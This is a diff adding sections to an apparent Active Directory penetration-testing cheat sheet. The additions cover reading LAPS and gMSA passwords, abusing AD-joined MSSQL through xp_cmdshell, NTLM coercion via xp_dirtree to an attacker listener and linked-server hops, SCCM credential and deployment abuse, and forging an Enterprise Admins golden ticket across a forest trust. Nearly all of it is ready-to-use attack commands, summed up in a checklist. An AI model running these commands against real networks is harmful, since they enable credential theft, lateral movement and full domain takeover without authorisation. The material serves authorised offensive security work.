@@ -391,6 +391,56 @@ nxc smb $TARGET_IP -u user -p 'password' -x "gpupdate /force"
 
 ---
 
+## Managed Credentials — LAPS / gMSA
+
+```bash
+# LAPS — local admin password, readable if your principal has the right (BloodHound: ReadLAPSPassword)
+nxc ldap $DC -u $USER -p $PASS --laps                 # legacy ms-Mcs-AdmPwd + Windows LAPS
+nxc smb  $DC -u $USER -p $PASS --laps                 # then use as local admin (PtH / SMB exec)
+
+# gMSA — managed service account password → NT hash (BloodHound: ReadGMSAPassword)
+nxc ldap $DC -u $USER -p $PASS --gmsa                 # or gMSADumper.py -u $USER -p $PASS -d $DOMAIN
+# Server 2025: dMSA "BadSuccessor" escalation — watch for delegated MSAs you can write
+```
+
+> Both are quiet LDAP reads (no cracking, no lockout). A LAPS read = local admin on that host; a gMSA
+> read = the service account's hash, often privileged and reused across hosts.
+
+## AD-Joined MSSQL — Lateral Pivot
+
+```bash
+nxc mssql $HOST -u $USER -p $PASS -x "whoami"          # -H for hash; --local-auth for SQL logins
+impacket-mssqlclient $DOMAIN/$USER:$PASS@$HOST -windows-auth
+# in mssqlclient:
+enable_xp_cmdshell ;  xp_cmdshell whoami               # exec as the SQL service account
+exec master..xp_dirtree '\\$LHOST\x'                   # coerce SQL svc auth → Responder / ntlmrelayx
+enum_links ;  use_link [LINKED]                         # hop across linked-server trust to other instances
+```
+
+> SQL service accounts often hold SeImpersonate → SYSTEM (Potato). xp_dirtree NTLM capture is quieter
+> than enabling xp_cmdshell. Disable xp_cmdshell when done.
+
+## SCCM / MECM (high-value — runs as SYSTEM)
+
+```bash
+sccmhunter find -u $USER -p $PASS -d $DOMAIN -dc-ip $DC      # site server, MP, DP, roles
+sccmhunter show -u $USER -p $PASS -d $DOMAIN -dc-ip $DC
+# NAA / client-push creds: recover via relay (ntlmrelayx) or a PXE boot-media leak
+# With the right role: scope a benign app/script deployment to a test collection → SYSTEM exec, then REVERT
+```
+
+## Forest / Trust Escalation
+
+```bash
+nxc ldap $DC -u $USER -p $PASS -M enum_trusts          # enumerate trusts (or ldapdomaindump / BloodHound)
+# Intra-forest child→parent (have child krbtgt from DCSync): forge a TGT with the Enterprise Admins SID
+impacket-ticketer -nthash $KRBTGT -domain-sid $CHILD_SID -extra-sid $EA_SID \
+  -domain child.corp.local Administrator               # SID filtering is NOT enforced within a forest
+# Inter-forest: dump the trust key (secretsdump the trust account), forge an inter-realm TGT
+```
+
+---
+
 ## Quick Wins Checklist
 
 - [ ] Anonymous LDAP / null SMB → users, descriptions with passwords
@@ -401,3 +451,7 @@ nxc smb $TARGET_IP -u user -p 'password' -x "gpupdate /force"
 - [ ] SMB relay (no signing) → SAM dump or shell
 - [ ] Local admin reuse → `nxc smb subnet/24` → lateral movement
 - [ ] BloodHound → shortest path from owned user to DA
+- [ ] LAPS / gMSA read rights → local admin / service-account hash (no crack)
+- [ ] AD-joined MSSQL → xp_cmdshell or linked-server hop
+- [ ] SCCM site present → NAA creds / SYSTEM deployment
+- [ ] Forest trust → child krbtgt + Enterprise Admins SID
